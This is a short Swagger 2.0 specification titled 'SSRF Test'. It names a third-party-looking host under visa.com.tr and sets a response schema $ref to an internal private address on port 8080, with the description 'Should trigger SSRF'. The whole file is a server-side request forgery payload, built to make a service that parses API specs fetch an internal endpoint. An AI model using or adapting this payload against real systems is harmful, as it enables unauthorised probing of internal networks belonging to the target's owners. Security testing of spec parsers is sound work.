swagger: "2.0"
info:
  title: "SSRF Test"
  version: "1.0"
host: "api.tektiklaode.visa.com.tr"
schemes:
  - https
paths:
  /test:
    get:
      summary: "SSRF Trigger"
      responses:
        200:
          description: "Should trigger SSRF"
          schema:
            $ref: "http://172.27.148.84:8080"
